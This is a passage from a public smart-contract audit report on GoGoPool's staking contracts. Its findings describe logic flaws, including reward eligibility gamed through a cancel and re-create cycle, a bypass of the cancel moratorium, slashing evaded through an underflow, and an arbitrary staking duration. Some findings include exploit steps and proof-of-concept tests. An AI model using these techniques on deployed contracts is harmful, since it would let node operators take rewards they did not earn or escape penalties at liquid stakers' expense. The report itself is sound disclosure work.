    		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
    		int256 index = requireValidMinipool(nodeID);
    		onlyOwner(index);
    		// make sure they meet the wait period requirement
    		if (block.timestamp - staking.getRewardsStartTime(msg.sender) < dao.getMinipoolCancelMoratoriumSeconds()) {
    			revert CancellationTooEarly();
    		}
    		_cancelMinipoolAndReturnFunds(nodeID, index);
    	}

    	function _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {
    		requireValidStateTransition(index, MinipoolStatus.Canceled);
    		setUint(keccak256(abi.encodePacked("minipool.item", index, ".status")), uint256(MinipoolStatus.Canceled));

    		address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));
    		uint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxNodeOpAmt")));
    		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));

    		Staking staking = Staking(getContractAddress("Staking"));
    		staking.decreaseAVAXStake(owner, avaxNodeOpAmt);
    		staking.decreaseAVAXAssigned(owner, avaxLiquidStakerAmt);

    		staking.decreaseMinipoolCount(owner);

    		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Canceled);

    		Vault vault = Vault(getContractAddress("Vault"));
    		vault.withdrawAVAX(avaxNodeOpAmt);
    		owner.safeTransferETH(avaxNodeOpAmt);
    	}

As you can see there is no check that user's minipool count is zero and if it is to reset the value of `RewardsStartTime` for user so if a user creates a minipool in the start of the cycle and then cancel it after 5 days and wait for end of the cycle and start another minipool and increase his staking AVAX he would be eligible for ggp rewards (`ClaimNodeOp.isEligible()` would return `true` for that user even so the user didn't run node for the required amount of time in the cycle). these are the steps to exploit this:

1.  node runner would create a minipool near start time of the ggp rewarding cycle and the value of `RewardsStartTime` would set for node runner.
2.  after 5 days that node runner's minipool has not been launched by multisig (for any reason) node runner would call `cancelMinipool()` and code would cancel his minipool but won't reset `RewardsStartTime` for node runner.
3.  after 20 days and near end of the gpp reward cycle node runner would create another minipool and start running node.
4.  in the end even so node runner only start running node and earning reward near end of the reward cycle but code would count node runner as eligible for rewards because `RewardsStartTime` for node runner shows wrong value.

This bug would cause rewards to be distributed wrongly between node runners and malicious node runners can bypass required time for running nodes during reward cycle to be eligible for rewards.

### Tools Used

VIM

### Recommended Mitigation Steps

Set the value of `RewardsStartTime` based on successfully finished minipools or when minipool is launched and user can't cancel minipool.

**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/555#issuecomment-1412633697):**
 > The Warden has shown how, due to `cancelMinipool` not resetting `rewardsStartTime` a pool owner could receive rewards for time in which they did not have any activePool.
> 
> Because this is contingent on the Multisig not cancelling the pool and because it would limit the attack to rewards, I believe Medium Severity to be the most appropriate.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Reset rewards start time in cancel minipool: [multisig-labs/gogopool#51](https://github.com/multisig-labs/gogopool/pull/51)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/16) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/35).



***

## [[M-11] MultisigManager may not be able to add a valid Multisig](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521)
*Submitted by [bin2chen](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521), also found by [immeas](undefined), [RaymondFam](undefined), [ast3ros](undefined), [cryptonue](undefined), [0xhunter](https://github.com/code-423n4/2022-12-gogopool-findings/issues/828), [adriro](https://github.com/code-423n4/2022-12-gogopool-findings/issues/765), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/349), and [Saintcode\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/189)*

When more than 10 mulitsig, it is impossible to modify or delete the old ones, making it impossible to create new valid ones.

### Proof of Concept

MultisigManager limits the number of Multisig to 10, which cannot be deleted or replaced after they have been disabled.<br>
This will have a problem, if the subsequent use of 10, all 10 for some reason, be disabled.<br>
Then it is impossible to add new ones and replace the old ones, so you have to continue using the old Multisig at risk.

```solidity
    function registerMultisig(address addr) external onlyGuardian {
        int256 multisigIndex = getIndexOf(addr);
        if (multisigIndex != -1) {
            revert MultisigAlreadyRegistered();
        }
        uint256 index = getUint(keccak256("multisig.count"));
        if (index >= MULTISIG_LIMIT) {
            revert MultisigLimitReached(); //***@audit limt 10, and no other way to delete or replace the old Multisig ***//
        }
```

### Recommended Mitigation Steps

Add replace old mulitsig method

```solidity
    function replaceMultisig(address addr,address oldAddr) external onlyGuardian {
        int256 multisigIndex = getIndexOf(oldAddr);
        if (multisigIndex == -1) {
            revert MultisigNotFound();
        }

        setAddress(keccak256(abi.encodePacked("multisig.item", multisigIndex, ".address")), addr);
        emit RegisteredMultisig(addr, msg.sender);
    }
```

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521)**

**[0xju1ie (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1396847761):**
 > I'd argue Low since its unlikely.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1396857560):**
 > I disagree @0xju1ie. I think it's an oversight not to have a way to delete old multisigs with the limit in place rather than a quality assurance issue. 

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1397034274):**
 > [\#349](https://github.com/code-423n4/2022-12-gogopool-findings/issues/349) has an interesting fix for this issue

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1401952336):**
 > Which was: "Count only the validated/enabled multisigs in order to control the limit."

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1413624527):**
 > The Warden has shown how, due to a logic flaw, the system can only ever add up to 10 multi sigs, even after disabling all, no more multi sigs could be added.
> 
> Because this shows how an external condition can break the functionality of the MultisigManager, I agree with Medium Severity.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1421429303):**
 > Acknowledged.
> 
> Not fixing right now, we don't foresee having many multisigs at launch, and will upgrade as necessary to support more. 



***

## [[M-12] Cancellation of minipool may skip `MinipoolCancelMoratoriumSeconds` checking if it was cancelled before](https://github.com/code-423n4/2022-12-gogopool-findings/issues/519)
*Submitted by [caventa](https://github.com/code-423n4/2022-12-gogopool-findings/issues/519), also found by [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/650), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/635), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/574), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/541), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/488), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/483), [Allarious](https://github.com/code-423n4/2022-12-gogopool-findings/issues/458), [stealthyz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/281), [mert\_eren](https://github.com/code-423n4/2022-12-gogopool-findings/issues/259), and [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/211)*

<https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L225-L227><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L279-L281>

When canceling a minipool that was canceled before, it may skip `MinipoolCancelMoratoriumSeconds` checking and allow the user to cancel the minipool immediately.

### Proof of Concept

A user may create a minipool.

    /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.
    	/// @param nodeID 20-byte Avalanche node ID
    	/// @param duration Requested validation period in seconds
    	/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)
    	/// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool
    	function createMinipool(
    		address nodeID,
    		uint256 duration,
    		uint256 delegationFee,
    		uint256 avaxAssignmentRequest
    	) external payable whenNotPaused {
    		if (nodeID == address(0)) {
    			revert InvalidNodeID();
    		}

    		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
    		if (
    			// Current rule is matched funds must be 1:1 nodeOp:LiqStaker
    			msg.value != avaxAssignmentRequest ||
    			avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||
    			avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()
    		) {
    			revert InvalidAVAXAssignmentRequest();
    		}

    		if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {
    			revert InsufficientAVAXForMinipoolCreation();
    		}

    		Staking staking = Staking(getContractAddress("Staking"));
    		staking.increaseMinipoolCount(msg.sender);
    		staking.increaseAVAXStake(msg.sender, msg.value);
    		staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);

    		if (staking.getRewardsStartTime(msg.sender) == 0) {
    			staking.setRewardsStartTime(msg.sender, block.timestamp);
    		}

    		uint256 ratio = staking.getCollateralizationRatio(msg.sender);
    		if (ratio < dao.getMinCollateralizationRatio()) {
    			revert InsufficientGGPCollateralization();
    		}

    		// Get a Rialto multisig to assign for this minipool
    		MultisigManager multisigManager = MultisigManager(getContractAddress("MultisigManager"));
    		address multisig = multisigManager.requireNextActiveMultisig();

    		// Create or update a minipool record for nodeID
    		// If nodeID exists, only allow overwriting if node is finished or canceled
    		// 		(completed its validation period and all rewards paid and processing is complete)
    		int256 minipoolIndex = getIndexOf(nodeID);
    		if (minipoolIndex != -1) {
    			onlyOwner(minipoolIndex);
    			requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
    			resetMinipoolData(minipoolIndex);
    			// Also reset initialStartTime as we are starting a whole new validation
    			setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0);

    		} else {
    			minipoolIndex = int256(getUint(keccak256("minipool.count")));
    			// The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()
    			setUint(keccak256(abi.encodePacked("minipool.index", nodeID)), uint256(minipoolIndex + 1));
    			setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".nodeID")), nodeID);
    			addUint(keccak256("minipool.count"), 1);
    		}

    		// Save the attrs individually in the k/v store
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);

    		setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);
    		setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".multisigAddr")), multisig);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpInitialAmt")), msg.value);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), msg.value);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), avaxAssignmentRequest);

    		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);

    		Vault vault = Vault(getContractAddress("Vault"));
    		vault.depositAVAX{value: msg.value}();
    	}

and after 5 days, the user cancels the minipool

    	/// @notice Owner of a minipool can cancel the (prelaunch) minipool
    	/// @param nodeID 20-byte Avalanche node ID the Owner registered with
    	function cancelMinipool(address nodeID) external nonReentrant {
    		Staking staking = Staking(getContractAddress("Staking"));
    		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
    		int256 index = requireValidMinipool(nodeID);
    		onlyOwner(index);
    		// make sure they meet the wait period requirement
    		if (block.timestamp - staking.getRewardsStartTime(msg.sender) < dao.getMinipoolCancelMoratoriumSeconds()) {
    			revert CancellationTooEarly();
    		}
    		_cancelMinipoolAndReturnFunds(nodeID, index);
    	}

Then, the user recreates the minipool again by calling the same createMinipool function. Then, the user cancels the minipool immediately. The user should not be allowed to cancel the minpool immediately and he should wait for 5 more days.

Added a test unit to MinipoolManager.t.sol

    	function testMinipoolManager() public {
    		address nodeID1 = randAddress();

    		vm.startPrank(nodeOp);
    		ggp.approve(address(staking), MAX_AMT);
    		staking.stakeGGP(100 ether);

    		{
    			MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);

    			skip(5 days);
    			minipoolMgr.cancelMinipool(mp.nodeID); // Must skip 5 days to be executed
    		}

    		{
    			MinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);
    			minipoolMgr.cancelMinipool(mp.nodeID); // Do not need 5 days more to be executed which is wrong
    		}

    		vm.stopPrank();
    	}

### Tools Used

Manual and added a test unit

### Recommended Mitigation Steps

Change the createMinipool function. Always setRewardsStartTime everytime the minipool is recreated.

    /// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.
    	/// @param nodeID 20-byte Avalanche node ID
    	/// @param duration Requested validation period in seconds
    	/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)
    	/// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool
    	function createMinipool(
    		address nodeID,
    		uint256 duration,
    		uint256 delegationFee,
    		uint256 avaxAssignmentRequest
    	) external payable whenNotPaused {
    		if (nodeID == address(0)) {
    			revert InvalidNodeID();
    		}

    		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
    		if (
    			// Current rule is matched funds must be 1:1 nodeOp:LiqStaker
    			msg.value != avaxAssignmentRequest ||
    			avaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||
    			avaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()
    		) {
    			revert InvalidAVAXAssignmentRequest();
    		}

    		if (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {
    			revert InsufficientAVAXForMinipoolCreation();
    		}

    		Staking staking = Staking(getContractAddress("Staking"));
    		staking.increaseMinipoolCount(msg.sender);
    		staking.increaseAVAXStake(msg.sender, msg.value);
    		staking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);

    		--- if (staking.getRewardsStartTime(msg.sender) == 0) {
    			staking.setRewardsStartTime(msg.sender, block.timestamp);
    		--- }

    		uint256 ratio = staking.getCollateralizationRatio(msg.sender);
    		if (ratio < dao.getMinCollateralizationRatio()) {
    			revert InsufficientGGPCollateralization();
    		}

    		// Get a Rialto multisig to assign for this minipool
    		MultisigManager multisigManager = MultisigManager(getContractAddress("MultisigManager"));
    		address multisig = multisigManager.requireNextActiveMultisig();

    		// Create or update a minipool record for nodeID
    		// If nodeID exists, only allow overwriting if node is finished or canceled
    		// 		(completed its validation period and all rewards paid and processing is complete)
    		int256 minipoolIndex = getIndexOf(nodeID);
    		if (minipoolIndex != -1) {
    			requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
    			resetMinipoolData(minipoolIndex);
    			// Also reset initialStartTime as we are starting a whole new validation
    			setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0);
    		} else {
    			minipoolIndex = int256(getUint(keccak256("minipool.count")));
    			// The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()
    			setUint(keccak256(abi.encodePacked("minipool.index", nodeID)), uint256(minipoolIndex + 1));
    			setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".nodeID")), nodeID);
    			addUint(keccak256("minipool.count"), 1);
    		}

    		// Save the attrs individually in the k/v store
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);
    		setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);
    		setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".multisigAddr")), multisig);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpInitialAmt")), msg.value);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")), msg.value);
    		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")), avaxAssignmentRequest);

    		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);

    		Vault vault = Vault(getContractAddress("Vault"));
    		vault.depositAVAX{value: msg.value}();
    	}

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/519)**

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/519#issuecomment-1398302235):**
 > This solution would mess up other aspects of the protocol. In cancel minipool, we should really just check the minipoolStartTime against the cancelMoratoriumSeconds. 

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/519#issuecomment-1407750433):**
 > The warden has shown a logic flaw in the Finite State Machine, as shown in the POC, cancelling a second miniPool can be done before `MinipoolCancelMoratoriumSeconds`.
> 
> Because the exploit doesn't demonstrate a reliable way to extra value or funds from the protocol, I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Base cancelMinipool delay on minipool creation time not rewards start time: [multisig-labs/gogopool#40](https://github.com/multisig-labs/gogopool/pull/40)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/17) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/37).



***

## [[M-13] Slashing fails when node operator doesn't have enough staked `GGP`](https://github.com/code-423n4/2022-12-gogopool-findings/issues/494)
*Submitted by [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/494), also found by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/886), [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/826), [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/645), [yixxas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/561), [ck](https://github.com/code-423n4/2022-12-gogopool-findings/issues/437), [cccz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/333), [nameruse](https://github.com/code-423n4/2022-12-gogopool-findings/issues/278), [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/183), [0x73696d616f](https://github.com/code-423n4/2022-12-gogopool-findings/issues/142), and [koxuan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/131)*

When creating a minipool the node operator is required to put up a collateral in `GGP`, the protocol token. The amount of `GGP` collateral needed is currently calculated to be 10% of the `AVAX` staked. This is calculated using the price of `GGP - AVAX`.

If the node operator doesn't have high enough availability and doesn't get any rewards the protocol will slash their `GGP` collateral to reward liquid stakers. This is also calculated using the price of `GGP - AVAX`:

```javascript
File: MinipoolManager.sol

547:	function calculateGGPSlashAmt(uint256 avaxRewardAmt) public view returns (uint256) {
548:		Oracle oracle = Oracle(getContractAddress("Oracle"));
549:		(uint256 ggpPriceInAvax, ) = oracle.getGGPPriceInAVAX(); // price might change or be manipulated
550:		return avaxRewardAmt.divWadDown(ggpPriceInAvax);
551:	}

...

670:	function slash(int256 index) private {

...

673:		uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
674:		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
675:		uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
676:		uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);

...

681:		Staking staking = Staking(getContractAddress("Staking"));
682:		staking.slashGGP(owner, slashGGPAmt);
683:	}
```

This is then subtracted from their staked amount:

```javascript
File: Staking.sol

94: 	function decreaseGGPStake(address stakerAddr, uint256 amount) internal {
95: 		int256 stakerIndex = requireValidStaker(stakerAddr);
96: 		subUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".ggpStaked")), amount); // can fail due to underflow
97: 	}

...

379:	function slashGGP(address stakerAddr, uint256 ggpAmt) public onlySpecificRegisteredContract("MinipoolManager", msg.sender) {
380:		Vault vault = Vault(getContractAddress("Vault"));
381:		decreaseGGPStake(stakerAddr, ggpAmt);
382:		vault.transferToken("ProtocolDAO", ggp, ggpAmt);
383:	}
```

The issue is that the current staked amount is never checked so the `subUint` can fail due to underflow if the price has changed since the minipool was created/recreated.

### Impact

If a node operator doesn't have enough collateral, possibly caused by price changes in `GGP` during slashing they evade slashing all together.

It's even possible for the node operator to foresee this and manipulate the price of `GGP` just prior to the period ending if they know that they are going to be slashed.

### Proof of Concept

PoC test in `MinipoolManager.t.sol`:

```javascript
	function testRecordStakingEndWithSlashNotEnoughStake() public {
		uint256 duration = 365 days;
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
		uint128 ggpStakeAmt = 100 ether; // just enough

		vm.startPrank(nodeOp);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(ggpStakeAmt);
		MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
		vm.stopPrank();

		address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
		vm.prank(liqStaker1);
		ggAVAX.depositAVAX{value: MAX_AMT}();

		vm.prank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

		bytes32 txID = keccak256("txid");
		vm.prank(address(rialto));
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		skip(2 weeks);
		
		vm.prank(address(rialto)); // price changes just a bit
		oracle.setGGPPriceInAVAX(0.999 ether, block.timestamp);

		vm.prank(address(rialto));
		vm.expectRevert(); // staking cannot end because of underflow
		minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);
	}
```

The only thing the protocol can do now is to call `recordStakingError` for the minipool, since no other state changes are allowed. This will return the staked funds but it will not slash the `GGP` amount for the node operator. Hence the node operator has evaded the slashing.

### Tools Used

vs code, forge

### Recommended Mitigation Steps

If the amount to be slashed is greater than what the node operator has staked, slash all their stake.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/494#issuecomment-1416338579):**
 > The Warden has shown a risk to the protocol, in cases in which the price of GPP drops too low, slashing could not be performed.
> 
> In contrast to other reports, this is a finding that shows an issue with the system and it's consequences, more so than an economic attack.
> 
> For this reason I believe Medium to be the most appropriate severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > If staked GGP doesn't cover slash amount, slash it all: [multisig-labs/gogopool#41](https://github.com/multisig-labs/gogopool/pull/41)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/56) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/38).



***

## [[M-14] Any duration can be passed by node operator](https://github.com/code-423n4/2022-12-gogopool-findings/issues/492)
*Submitted by [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/492), also found by [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/880), [V\_B](https://github.com/code-423n4/2022-12-gogopool-findings/issues/841), [0xbepresent](https://github.com/code-423n4/2022-12-gogopool-findings/issues/345), [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/215), and [0x73696d616f](https://github.com/code-423n4/2022-12-gogopool-findings/issues/138)*

<https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L196-L269><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L560>

When a node operator creates a minipool they pass which duration they want to stake for. There is no validation for this field so they can pass any field:

```javascript
File: MinipoolManager.sol

196:	function createMinipool(
197:		address nodeID,
198:		uint256 duration,
199:		uint256 delegationFee,
200:		uint256 avaxAssignmentRequest
201:	) external payable whenNotPaused {

...     // no validation for duration

256:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
257:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".duration")), duration); // duration stored
258:		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".delegationFee")), delegationFee);
```

Later when staking is done. if the node op was slashed, `duration` is used to calculate the slashing amount:

```javascript
File: MinipoolManager.sol

557:	function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) {
558:		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
559:		uint256 rate = dao.getExpectedAVAXRewardsRate();
560:		return (avaxAmt.mulWadDown(rate) * duration) / 365 days;
561:	}

...

670:	function slash(int256 index) private {

...

673:		uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
674:		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
675:		uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
676:		uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
```

The node operator cannot pass in `0` because that reverts due to zero transfer check in Vault. However the node operator can pass in `1` to guarantee the lowest slash amount possible.

Rialto might fail this, but there is little information about how Rialto uses the `duration` passed. According to this comment they might default to `14 days` in which this finding is valid:

> JohnnyGault — 12/30/2022 3:22 PM

> To clarify duration for everyone -- a nodeOp can choose a duration they want, from 14 days to 365 days. But behind the scenes, Rialto will only create a validator for 14 days. ...

### Impact

The node operator can send in a very low `duration` to get minimize slashing amounts. It depends on the implementation in Rialto, which we cannot see. Hence submitting this.

### Proof of Concept

PoC test in `MinipoolManager.t.sol`:

```javascript
	function testRecordStakingEndWithSlashZeroDuration() public {
		uint256 duration = 1; // zero duration causes vault to fail on 0 amount
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
		uint128 ggpStakeAmt = 200 ether;

		vm.startPrank(nodeOp);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(ggpStakeAmt);
		MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
		vm.stopPrank();

		address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
		vm.prank(liqStaker1);
		ggAVAX.depositAVAX{value: MAX_AMT}();

		vm.prank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

		bytes32 txID = keccak256("txid");
		vm.prank(address(rialto));
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		skip(2 weeks);
		
		vm.prank(address(rialto));
		minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);

		assertEq(vault.balanceOf("MinipoolManager"), depositAmt);

		int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
		MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);
		assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));
		assertEq(mp1Updated.avaxTotalRewardAmt, 0);
		assertTrue(mp1Updated.endTime != 0);

		assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);
		assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);

		assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);

		assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);
		assertEq(staking.getMinipoolCount(mp1Updated.owner), 0);

		// very small slash amount
		assertLt(mp1Updated.ggpSlashAmt, 0.000_01 ether);
		assertGt(staking.getGGPStake(mp1Updated.owner), ggpStakeAmt - 0.000_01 ether);
	}
```

### Tools Used

vs code, forge

### Recommended Mitigation Steps

Regardless if Rialto will fail this or not, I recommend that the `duration` passed is validated to be within `14 days` and `365 days`.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/492#issuecomment-1413678353):**
 > The Warden has shown how, due to a lack of check, a duration below 14 days can be set, this could also be used to reduce the slash penalty.
> 
> I believe that in reality, such a pool will be closed via `recordStakingError`, however, this enables a grief that could impact the Protocol in a non-trivial manner.
> 
> For this reason, I believe the most appropriate severity to be Medium.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Added bounds for duration passed by Node Operator: [multisig-labs/gogopool#38](https://github.com/multisig-labs/gogopool/pull/38)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/57) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/39).



***

## [[M-15] Wrong reward distribution between early and late depositors because of the late `syncRewards()` call in the cycle, `syncReward()` logic should be executed in each withdraw or deposits (without reverting)](https://github.com/code-423n4/2022-12-gogopool-findings/issues/478)
